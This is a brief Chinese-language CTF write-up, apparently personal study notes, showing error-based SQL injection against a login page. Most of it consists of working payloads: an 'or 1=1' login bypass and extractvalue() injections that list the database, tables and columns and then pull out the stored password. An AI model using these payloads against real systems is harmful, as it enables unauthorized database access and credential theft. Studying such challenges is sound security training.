![[Pasted image 20221106102433.png]]

![[Pasted image 20221106102446.png]]
```sql
?username=admin&password=1' or 1=1 or '1
```
![[Pasted image 20221106102957.png]]

这里引入了一个新的概念：**报错注入**

![[Pasted image 20221106103349.png]]

```sql
username=admin&password=1'^extractvalue(1,concat(0x5c,(select(database()))))#
```
![[Pasted image 20221106104824.png]]

爆表
```sql
username=admin&password=1'^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))#
```
![[Pasted image 20221106105754.png]]

爆字段
```sql
username=admin&password=1'^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))#
```
![[Pasted image 20221106110012.png]]

成功近在咫尺
```sql
username=admin&password=1'^extractvalue(1,concat(0x5c,(select(password)from(geek.H4rDsq1))))#
```
![[Pasted image 20221106110239.png]]

貌似是错误信息限制了长度
```sql
username=admin&password=1'^extractvalue(1,concat(0x5c,(select(right(password,30))from(geek.H4rDsq1))))#
```
![[Pasted image 20221106110613.png]]

#Web #SQL注入 #报错注入 